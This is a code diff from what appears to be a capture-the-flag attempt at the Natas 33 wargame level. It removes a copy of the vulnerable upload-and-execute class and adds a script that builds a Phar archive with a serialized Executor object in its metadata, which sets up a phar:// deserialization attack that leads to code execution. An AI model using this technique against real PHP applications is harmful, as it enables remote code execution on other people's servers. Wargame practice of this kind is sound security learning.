@@ -19,41 +19,9 @@
     // ~morla
     class Executor
     {
-        private $filename = "";
-        private $signature = 'adeafbadbabec0dedabada55ba55d00d';
+        private $filename = "upload1.php";
+        private $signature = '74c5f6d942738df6a5683e4dae1e738d';
         private $init = False;
-
-        function __construct()
-        {
-            //$this->filename = $_POST["filename"];
-            $this->signature = "a298087bdc62c917696d22cd9649c0fc";
-            $this->filename = "upload1.php";
-            if (filesize($_FILES['uploadedfile']['tmp_name']) > 4096) {
-                echo "File is too big<br>";
-            } else {                                                                //           ../../../../../natas33/upload/myownlittleindex.php
-                if (move_uploaded_file($_FILES['uploadedfile']['tmp_name'], "/natas33/upload/" . $this->filename)) {
-                    echo "The update has been uploaded to: /natas33/upload/$this->filename<br>";
-                    echo "Firmware upgrad initialised.<br>";
-                } else {
-                    echo "There was an error uploading the file, please try again!<br>";
-                }
-            }
-        }
-
-        function __destruct()
-        {
-            // upgrade firmware at the end of this script
-    
-            // "The working directory in the script shutdown phase can be different with some SAPIs (e.g. Apache)."
-            chdir("/natas33/upload/");
-            if (md5_file($this->filename) == $this->signature) {
-                echo "Congratulations! Running firmware update: $this->filename <br>";
-                passthru("php " . $this->filename);
-            } else {
-                echo "Failur! MD5sum mismatch!<br>";
-            }
-            echo "<br>__destruct<br>";
-        }
     }
     ?>
 
@@ -77,9 +45,27 @@
         O:8:"Executor":3:{s:18:"Executorfilename";s:9:"asdasdasd";s:19:"Executorsignature";s:32:"adeafbadbabec0dedabada55ba55d00d";s:14:"Executorinit";b:0;}
         */
         // create new Phar
-        echo md5_file("phar://test.phar/test.txt") . '<br>';
+        echo md5_file("upload1.php") . "<br>";
+
+        $phar = new Phar('test.phar');
+        $phar->startBuffering();
+        $phar->addFromString('test.txt', 'text');
+        $phar->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");
+
+        $test = new Executor();
+        echo serialize($test) . '<br>';
+        $phar->setMetadata($test);
+        $phar->stopBuffering();
+
+        echo "<br>--------------------------------------------<br>";
+        echo md5_file('test.phar');
+        echo "<br>--------------------------------------------<br>";
 
         exit;
+
+        if (array_key_exists("filename", $_POST) and array_key_exists("uploadedfile", $_FILES)) {
+            new Executor();
+        }
         ?>
         <form enctype="multipart/form-data" action="index.php" method="POST">
             <input type="hidden" name="MAX_FILE_SIZE" value="4096" />
